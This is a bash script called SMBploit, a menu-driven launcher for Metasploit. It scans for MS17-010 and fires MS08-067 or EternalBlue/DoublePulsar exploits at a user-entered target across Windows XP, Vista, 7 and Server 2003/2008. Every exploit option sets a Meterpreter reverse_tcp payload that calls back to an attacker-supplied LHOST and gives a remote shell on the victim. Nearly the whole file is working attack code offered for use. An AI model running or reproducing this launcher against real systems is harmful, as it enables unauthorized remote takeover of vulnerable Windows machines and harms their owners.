#!/bin/bash

#Author:  d4t4s3c
#Twitter: @d4t4s3c
#Email:   d4t4s3c@protonmail.com
#GitHub:  www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
nc="\e[0m"

#var
shell="$"
v1="Scan"
v2='Exploit'
v3='Exit'
so1='Windows XP'
so2='Windows Server 2003 SP0'
so3='Windows Server 2003 SP1+2'
so4='Windows Server 2003'
so5='Windows Vista'
so6='Server 2008'
so7='Server 2008 R2'
so8='Windows 7'
arch1='x86'
arch2='x64'
n01=01
n02=02
n03=03
n04=04
n05=05
n06=06
n07=07
n08=08
n09=09
n10=10
n11=11
n12=12
n13=13
n99=99
si=✔
no=✘

function checkroot(){
	    echo ""
	    echo -e "$a check root user $nc"
	    sleep 4
    if [ "$(id -u)" == "0" ]; then
	    echo ""
	    echo -e " $b[$v$si$b] root $nc"
	    sleep 4
	    echo ""
    else
            echo ""
	    echo -e " $b[$r$no$b] root $nc"
	    sleep 4
	    echo ""
	    echo -e "$r EXITING $nc"
	    sleep 4
	    echo ""
	    exit 1
    fi	
}

function banner(){
	echo -e "$b┌══════════════════════════════════════════┐"
        echo -e "$b║$v  ____  __  __ ____        _       _ _    $b║"
        echo -e "$b║$v / ___||  \/  | __ ) _ __ | | ___ (_) |_  $b║"
        echo -e "$b║$v \___ \| |\/| |  _ \| '_ \| |/ _ \| | __| $b║"
        echo -e "$b║$v  ___) | |  | | |_) | |_) | | (_) | | |_  $b║"
        echo -e "$b║$v |____/|_|  |_|____/| .__/|_|\___/|_|\__| $b║"
        echo -e "$b║$r Author $b:$a d4t4s3c $b $v |_|                   $b║"
        echo -e "$b║$r Email  $b:$a d4t4s3c@protonmail.com          $b║"
        echo -e "$b║$r Twitter$b:$a @d4t4s3c                        $b║" 
        echo -e "$b║$r GitHub $b:$a www.github.com/d4t4s3c          $b║"
        echo -e "$b└══════════════════════════════════════════┘$b"
}

function main(){
	echo ""
        echo -e "$b[$v$n01$b] [$r$v1$b]$nc"
        echo -e "$b[$v$n02$b] [$r$v2$b] [$a$so1 $b-------------- $v$arch1$b]$nc"
        echo -e "$b[$v$n03$b] [$r$v2$b] [$a$so1 $b-------------- $v$arch2$b]$nc"
        echo -e "$b[$v$n04$b] [$r$v2$b] [$a$so2 $b- $v$arch1$b]$nc"
        echo -e "$b[$v$n05$b] [$r$v2$b] [$a$so3 $v$arch1$b]$nc"
        echo -e "$b[$v$n06$b] [$r$v2$b] [$a$so4 $b----- $v$arch2$b]$nc"
        echo -e "$b[$v$n07$b] [$r$v2$b] [$a$so5 $b----------- $v$arch1$b]$nc"
        echo -e "$b[$v$n08$b] [$r$v2$b] [$a$so5 $b----------- $v$arch2$b]$nc"
        echo -e "$b[$v$n09$b] [$r$v2$b] [$a$so6 $b------------- $v$arch1$b]$nc"
        echo -e "$b[$v$n10$b] [$r$v2$b] [$a$so7 $b---------- $v$arch1$b]$nc"
        echo -e "$b[$v$n11$b] [$r$v2$b] [$a$so7 $b---------- $v$arch2$b]$nc"
        echo -e "$b[$v$n12$b] [$r$v2$b] [$a$so8 $b--------------- $v$arch1$b]$nc"
        echo -e "$b[$v$n13$b] [$r$v2$b] [$a$so8 $b--------------- $v$arch2$b]$nc"
        echo -e "$b[$v$n99$b] [$r$v3$b]$nc"
        echo ""
}

function menu(){

read -p " $(echo -e $v$shell $nc)" opc

    if [ $opc -eq 01 ]; then
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    clear
	    echo -e "$a Scan IP:$v $rhost $nc"
	    echo ""
	    msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010;
	    set RHOSTS $rhost;
	    run;
	    exit; "
	    echo ""
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 02 ]; then
	    echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 03 ]; then
	    echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 04 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 1;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 05 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 2;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 06 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 3;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
            echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 07 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 4;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 08 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 5;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 09 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 6;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 10 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 7;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 11 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 7;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 12 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 8;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 13 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 8;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 99 ]; then
	    echo ""
	    echo ""
	    echo -e "$a        |\/\/\/|"
            echo -e "        |      |" 
            echo -e "        |      |" 
            echo -e "        | (o)(o) " 
            echo -e "        C      _) "
            echo -e "         | ,___|  "
            echo -e "         |   /    "
            echo -e "        /____\ "
            echo -e "       /      \ $nc"
            echo -e "$b#### $v BYE $v HACKER $b ####"
            echo ""
            echo ""
	    sleep 3
	    tput cnorm
	    exit 0
    else
	    echo ""
	    echo -e "$a invalid option $nc"
	    echo ""
	    sleep 2
	    clear
	    sleep 1
	    main
	    menu
    fi
}

tput civis
clear
checkroot
service postgresql start
clear
banner
main
tput cnorm
menu
